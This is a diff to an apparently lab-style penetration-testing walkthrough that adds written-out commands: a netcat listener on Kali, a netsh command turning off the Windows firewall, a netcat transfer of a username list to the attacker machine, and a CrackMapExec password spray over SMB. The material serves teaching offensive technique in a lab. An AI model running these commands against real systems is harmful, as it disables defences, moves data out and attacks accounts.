@@ -39,7 +39,9 @@ It should look like this:
 ![](attachments/Clipboard_2020-06-16-10-37-09.png)
 
 Next we are going to password spray against SMB (port 445) which we know is open by the results of previous NMAP scan.
-For now lets transfer a list of usernames to our kali machine by netcat. To do it we need the ip of our machine and run the next commands. Cancel out netcat (Ctrl-C) after 3 seconds.
+For now lets transfer a list of usernames to our kali machine by netcat. To do it we need the ip of our machine and run the following command.
+
+`nc -lv -p 2222 > users`
 
 ![](attachments/kali-netcat.png)
 
@@ -48,14 +50,19 @@ Now switch to command prompt on windows machine.
 ![](../AppLocker/attachments/cmd-command-prompt.png)
 
 Disable firewall.
+C:\Tools> `netsh advfirewall set allprofiles state off`
 
-![](../AppLocker/attachments/disable-firewall.png)
+![](attachments/disable-firewall.png)
 
-And transfer the file to kali.
+And transfer the file to kali by running the next command 
+
+C:\Tools> `nc <IP> 2222 < ..\temp\UserList.txt` (Cancel out netcat (Ctrl-C) after 3 seconds.).
 
 ![](attachments/win-netcat.png)
 
-We will use the tool CrackMapExec for password spray attack over smb. The tool supports other protocols like ssh, winrm, ldap etc. The command looks like this - `cme smb <IP> -u users -p Winter2020 --shares`.
+We will use the tool CrackMapExec for password spray attack over smb. The tool supports other protocols like ssh, winrm, ldap etc. 
+
+The command looks like this - `cme smb <IP> -u users -p Winter2020 --shares`.
 
 ![](attachments/cme-result.png)
 
